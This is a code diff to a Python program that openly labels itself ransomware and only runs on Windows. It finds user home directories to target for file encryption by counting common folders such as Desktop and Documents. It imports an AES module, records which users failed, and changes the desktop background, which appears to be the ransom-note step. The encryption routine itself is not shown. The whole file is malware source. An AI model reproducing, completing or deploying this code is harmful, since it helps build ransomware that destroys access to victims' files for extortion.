@@ -1,12 +1,14 @@
-import os
-import sys
+from lib import aes
+from lib import background
 import json
+import sys
+import os
 
 
 def get_score(path):
     """
-    In a windows operating system some common folders are set in the c/users/user
-    This function detects how many common folder there are in path.
+    In a windows os some common folders are placed in the user home dir.
+    This function detects how many common folders there are in the users home dir.
     """
 
     common_folders = ['Desktop', 'Downloads', 'Dropbox', 'Music', 'Documents', 'Videos', 'Links']
@@ -21,7 +23,7 @@ def get_score(path):
 
 
 def get_targeted_users(return_failed_users=False):
-    """Returns the user who's files are going to be encrypted."""
+    """Returns the users home directory who's files are going to be encrypted."""
 
     failed_users = {}
     targeted_users = []
@@ -57,9 +59,11 @@ def write_failed_users():
         )
 
 
-write_failed_users()
+if __name__ == '__main__':
+    if sys.platform != 'win32':
+        sys.exit('ERROR: Ransomware only supports windows.')
 
+    write_failed_users()
 
-
-
-
+    # Change background.
+    background.changeBG(background.get_background())
